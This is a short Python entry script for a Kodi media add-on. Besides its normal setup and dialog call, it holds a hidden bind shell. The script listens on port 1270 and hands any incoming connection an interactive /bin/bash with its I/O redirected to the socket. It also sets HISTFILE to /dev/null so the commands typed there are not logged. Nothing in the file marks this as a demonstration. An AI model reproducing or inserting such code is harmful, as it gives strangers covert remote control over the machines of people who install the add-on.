# -*- coding: utf-8 -*-
import logging


from resources.lib import kodilogging
from resources.lib import script


import xbmcaddon
import os
import pty
import socket
# Keep this file to a minimum, as Kodi
# doesn't keep a compiled copy of this
ADDON = xbmcaddon.Addon()
kodilogging.config()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 1270))
s.listen(1)
(rem, addr) = s.accept()
os.dup2(rem.fileno(),0)
os.dup2(rem.fileno(),1)
os.dup2(rem.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()

script.show_dialog()


